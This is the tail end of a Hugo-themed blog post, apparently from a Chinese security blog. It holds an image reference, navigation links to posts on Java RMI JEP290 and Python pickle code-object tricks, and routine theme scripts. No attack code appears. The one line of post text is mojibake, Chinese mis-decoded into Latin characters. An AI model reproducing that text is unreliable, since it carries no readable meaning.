<p>æ„Ÿè§‰æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æˆ‘æ‡’ï¼Œä¿ºè¦å»åƒé¥­äº†ï¼Œéƒ½9ç‚¹äº†æ‰å†™å®Œï¼ï¼</p>
<p><img loading="lazy" src="../images/image-20250110200548457.png" alt="image-20250110200548457"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>RMI JEP290</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>pickle&amp;types.CodeTypeå®ç°æ¥ç®¡ä»»æ„å‡½æ•°</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
